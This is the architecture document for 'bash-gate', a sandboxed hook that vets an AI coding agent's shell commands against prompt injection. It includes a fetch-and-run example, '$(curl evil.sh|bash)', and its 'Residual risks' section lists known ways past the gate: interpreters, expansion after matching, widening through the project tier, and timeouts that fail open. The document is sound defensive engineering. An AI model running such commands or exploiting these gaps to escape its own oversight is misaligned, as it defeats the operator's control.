# bash-gate architecture

The design of `bash-gate` as a set of distinct decisions and their implications.
For *how* commands are evaluated see [`EVALUATION.md`](EVALUATION.md); for the
rule DSL see [`RULES.md`](RULES.md); for the Claude Code wire contract see
[`CLAUDE_CODE_HOOKS.md`](CLAUDE_CODE_HOOKS.md).

---

## Foundational assumptions

### Operating context

Two properties of the deployment the whole gate exists to serve:

- **The agent (Claude / the Agent Harness) runs inside a sandbox.** The gate is
  a second, complementary layer, not the only wall: it assumes the harness is
  already confined by a sandbox (in practice `nono`) that bounds filesystem and
  network reach. This is what lets several decisions stand as written — the gate
  ships its engine and rules read-only *because* `~/.claude` is writable from
  inside that sandbox (**Install location**); self-protection of the gate's own
  files is delegated to the sandbox profile (**Self-protection**); the
  **Sandbox gate** actively refuses to run unless that sandbox is present
  (`NONO_CAP_FILE`), so a rule set can never silently execute unconfined; and
  redirect containment exists precisely because a write like
  `> ~/.claude/settings.json` is *sandbox-permitted* and therefore still needs
  bounding here (**Redirects**). Remove the sandbox and these are no longer
  sufficient: the agent could edit the rules, disable the hook, or reach files
  the containment logic assumed were unreachable.
- **The user wants safety without approving every call.** The point of the gate
  is to remove the human from the common path while keeping a backstop for the
  uncommon one. This is the whole justification for the **outcome model**:
  known-good commands `allow` silently, known-bad `deny`, and only the genuinely
  *unmatched* fall through to `ask`. A design that denied everything unknown, or
  prompted on everything, would satisfy "safe" but violate this assumption; one
  that allowed everything unknown would satisfy "no prompts" but violate safety.
  The allowlist-with-`ask`-fallthrough is the specific shape that honours both,
  and `automode` is the variant that hands the fallthrough to Claude Code's
  classifier when even fewer prompts are wanted.

If the sandbox assumption fails, the containment, install-location, and
self-protection decisions must be revisited; if the low-friction assumption
fails, the outcome model's `ask` fallthrough is the wrong default.

### Bash tool mechanics

Two properties of the Claude Code Bash tool the containment and assignment logic
rest on:

- **Shell state does not persist across calls.** Env vars, functions, and
  aliases are re-initialised from the user's profile on every Bash call. This is
  what lets the gate refuse assignments and function declarations outright
  without breaking multi-step workflows — there is no "set it once, use it
  later" to preserve.
- **The hook reports the invocation's working directory as `cwd`.** The gate
  reads that field from the per-call hook JSON and never inspects its own process
  working directory, so it does not matter whether the Bash tool's working
  directory persists across calls (e.g. `CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR`
  resets it every call). Whatever directory the command actually runs in is the
  one reported, which makes `cwd` a trustworthy containment base for redirect and
  `./` resolution.

If either mechanic ever changes, the containment and assignment-denial designs
must be revisited.

---

## Design decisions

Each decision, the choice made, and what it commits us to.

| Decision              | Choice                                                                                          | Implication                                                                                                       |
| --------------------- | ----------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| **Threat model**      | Adversarial (prompt injection)                                                                  | Achieved by **refusing** unresolvable constructs, never by evaluating them. Fail-closed is non-negotiable.       |
| **Outcome model**     | denylist → `deny`; allowlist → `allow`; **unmatched → `ask`**; unresolvable → `deny`            | Hard-denying everything unknown just punishes the operator; `ask` preserves a human backstop for novel commands. |
| **Parser**            | `mvdan.cc/sh/v3/syntax`, native Go                                                               | One dependency, no runtime deps, sub-5 ms parse. See [Why this parser](#why-this-parser).                         |
| **Path resolution**   | Inherited `PATH` + configured trust dirs; **no `realpath`**                                      | The gate resolves what bash will actually run; realpaths are version-pinned and break on upgrade.                |
| **Trust source**      | `trust` directives, never compiled in                                                           | Portable — no baked platform paths. The binary ships zero hardcoded filesystem paths.                            |
| **Match syntax**      | argv tokens, not string globs                                                                    | `git -c core.pager=sh status` defeats a glob but fails token matching.                                            |
| **`ANY` / `HAS`**     | `ANY` = 0-n tokens, one per rule; `HAS` = exactly one token, any position                        | Keeps matching linear with no backtracking; the matcher stays a pure, trivially-testable function.               |
| **Assignments**       | Deny any assignment prefix or bare assignment                                                    | `GIT_SSH_COMMAND=…` is execution through an allowed argv and is unreachable by `HAS`. Costs some usability.       |
| **Hidden words**      | Recurse `CmdSubst`/`ProcSubst`; deny `ParamExp`/`ArithmExp`/`FuncDecl`                            | Substitution *contents* are statically visible and checkable; parameter *values* are not, so they must deny.     |
| **Redirects**         | Containment on writes; deny all writes when `cd` is present                                       | `> ~/.claude/settings.json` is sandbox-permitted, so writes need bounding; `cd` moves the containment base.       |
| **Two-tier scope**    | Global binary + rules; project tier may add                                                     | An allowlist is inherently two-tier: machine policy plus per-repo additions.                                     |
| **Tier precedence**   | Global `deny` absolute; project `allow` may widen `ask`→`allow` but never overrides a global deny | The project file is repo-editable, so it can tighten freely but can never loosen a global deny.                  |
| **Loosening lives global** | `trust` / `sandbox` / `returntype` are global-tier only                                    | Anything that can *widen* policy is kept out of the attacker-editable project tier; ignored + logged there.       |
| **Config format**     | Line-oriented, inert DSL                                                                         | The project tier is attacker-editable, so config is matched, **never executed**.                                 |
| **Sandbox gate**      | `sandbox nono` requires `NONO_CAP_FILE`; directive global-only                                    | Refuses to run outside its intended sandbox unless explicitly, globally opted out via `dangerously-none`.        |
| **Install location**  | `$HOME/.claude-bash-rules/`, engine + rules read-only                                            | `~/.claude` is writable from inside the sandbox; the gate must live where the agent cannot disable it. Deployment example: [`conf/nono-profile.example.json`](../conf/nono-profile.example.json) (`.sandbox/` is the dev profile for building `bash-gate` itself). Nothing enforces this shape is actually delivered except the nono profile — `bash-gate selfcheck` (run inside the sandbox) probes it. |
| **Failure handling**  | Deny with reason; log all; deny on bad exit **or** empty/non-JSON output                          | "A control that fails open when it crashes is one segfault from absent." See [`CLAUDE_CODE_HOOKS.md`](CLAUDE_CODE_HOOKS.md#exit-codes). |
| **Deny signalling**   | `bash-gate` exits **2** (+ deny JSON) on deny, 0 otherwise; `gate.sh` propagates and forces exit 2 on any crash | Exit 2 is Claude Code's native blocking channel and needs no JSON parsing, so deny stays fail-closed even if the body is dropped. |
| **Return-type modes** | `decision` (default) vs `automode`; automode emits denials and explicit allows, defers only the unmatched fallthrough | Lets the allowlist act as a pre-filter in front of the auto-mode classifier instead of owning every decision.    |
| **Self-protection**   | Out of scope — Bash gating only                                                                  | Protecting the gate's own files is the nono profile's job, not the hook's. See [`conf/nono-profile.example.json`](../conf/nono-profile.example.json) and the README's "Example sandbox profile" and "Self-check" (`bash-gate selfcheck`) sections. |

---

## Why this parser

Command extraction needs a real shell parser — string/regex splitting gets
`git commit -m "fix && cleanup"` wrong, and `bash --pretty-print` / `bash -n`
re-emit source rather than structure (`\g\i\t` and `$(curl evil.sh)` survive
verbatim; `bash -n` happily accepts `git status && $(curl evil.sh|bash)`).

Among real parsers, `mvdan.cc/sh/v3/syntax` (native Go) wins on every axis that
matters here: ~4.6 ms parse vs ~59–74 ms for the Node/Python bridges, **no**
runtime dependency, a current grammar that handles `[[ ]]` and `$(())`, and a
usable AST. The npm `mvdan-sh` and WASM `sh-syntax` packages are downstream
bridges to the same Go library — using it directly removes the middleman.
`bashlex` (Python) fails outright on `[[ -f x ]]` and `$((1+2))`.

---

## Residual risks

Stated, not solved. These are the known edges of a fail-closed static gate:

- **Allowlisted interpreters reopen everything.** Allowing `python`, `node`, or
  `bash` grants arbitrary execution via `-c`/`-e`. Closed today only because they
  are absent from the allowlist — adding one is a policy mistake, not a bug.
- **Flag coverage is a blocklist.** `HAS` catches only the flags you enumerate.
  Anything dangerous but un-enumerated slips through.
- **Matching is pre-expansion.** Glob, brace, and tilde expansion happen at
  runtime, after matching. `rm {a,b}` and `--ext-dif?` are literal tokens to the
  parser, so `HAS` rules and any path-shaped matching can be evaded.
- **The project tier is agent-editable — detected via attestation, not
  enforced.** It can never override a global `deny`, but it is not purely
  tightening: a project `allow` can widen an unmatched (`ask`) command to
  `allow`, bypassing the prompt. A hostile diff can also add confusing
  denials. `bash-gate attest` records a human-approved hash of each tier
  (`RULES.md §10`); `loadConfig` recomputes it on every load and denies
  everything on any divergence, so neither in-session tampering nor a
  hostile-shipped `.claude-bash-rules` takes effect until attested on this
  machine. The trust anchor is that the attestation store is read-only inside
  the sandbox. `verifyAttestation` probes the store for writability before
  reading any record — if any write succeeds (overwrite, create, or
  parent-rename) it denies everything, so a misconfigured sandbox profile that
  leaves `attestations/` writable is caught at the gate, not discovered after
  the fact. In hook mode the install root is resolved via `getpwuid` (the
  password database) rather than `$CLAUDE_BASH_RULES_DIR` or `$HOME`, so the
  agent cannot redirect the gate to a pre-forged rule store by manipulating
  environment variables; operator commands (`validate`, `attest`, `test`,
  `selfcheck`) still honour the env vars.
- **Under `sandbox dangerously-none` attestation is skipped entirely!**
  Without a sandbox the agent can rewrite both rules and records, so checking
  hashes adds latency for zero security value.
  Those the name `dangerously-none` is a deliberate warning: it is only safe
  to use in a trusted environment where the agent cannot be tricked into running
  unconfined.
- **`automode` delegates the unmatched (`ask`) fallthrough** to Claude Code's
  classifier, so under it unknown commands no longer hit a guaranteed `ask`.
  Explicit `deny` and `allow` rules are still honoured. The human backstop for
  the unknown is only as strong as that classifier.
- **Assignment/`ParamExp` denial has a usability cost.** `git commit -m "$MSG"`
  and `FOO=1 make` are denied. Expect friction here first.
- **Hook timeout fails open**, and **logs are tamperable** from inside the
  sandbox — see [`CLAUDE_CODE_HOOKS.md`](CLAUDE_CODE_HOOKS.md#gatesh--fail-open-mitigation).
- **`GATE_DEBUG` stdin capture is sensitive** — it mirrors attacker-controlled
  command text and any argv secrets to `stdin.log`. Debug-only; keep it unset.

### Kill switch

If the gate misfires, the rules directory is read-only from inside the sandbox
and load failure denies everything, so recovery must happen from **outside** the
sandbox: remove the `PreToolUse` entry from `~/.claude/settings.json`, or point
`CLAUDE_BASH_RULES_DIR` at a directory containing a permissive `global/rules`.

---

## Environment assumptions

Machine-specific findings that drive the *starter* trust list, not the binary
(which bakes in nothing):

- **Several user-writable directories precede `/opt/homebrew/bin` in the live
  `PATH`** (`~/.bun/bin`, `~/.go/bin`, sandbox helper dirs, …). Anything dropped
  there shadows the real binary — which is exactly why resolution runs the
  inherited-`PATH` lookup and *then* applies the trusted-dir check, rather than
  trusting `PATH` order.
- **`/usr/local/bin` is world-writable** on this machine and is deliberately
  excluded from the starter trust list.
- Coreutils shims mean `ls` resolves to
  `/opt/homebrew/opt/coreutils/libexec/gnubin/ls`, not `/opt/homebrew/bin`; trust
  dirs must cover the shim path. This is also why `which`-style (stable) paths
  are trusted rather than `realpath` (version-pinned) ones.

---

## The `validate` linter

`bash-gate validate` lints rule files **before** they are installed and is
entirely outside the evaluation pipeline — no stdin, no sandbox gate, no logging,
no permission decision (usage in [`README.md`](../README.md#validate)).

Two design points worth stating:

- **It reports every error, not the first.** The runtime loader is fail-closed:
  the first malformed line collapses the config to deny-all, which is useless for
  editing. `validate` shares the loader's exact per-line verdict (`parseLine`,
  extracted from `parseTier`) but *continues* past errors so all of them surface
  with line numbers. Same parser, opposite stopping rule.
- **Semantic warnings are sound, never speculative.** Dead rules (unconditionally
  denied or safe-builtin commands), shadowed allows (only when a deny provably
  covers every command the allow could match), ignored project-tier directives,
  missing trust dirs, and duplicates are warnings — they never change the exit
  code alone, and the shadow check stays silent on any case it cannot prove.
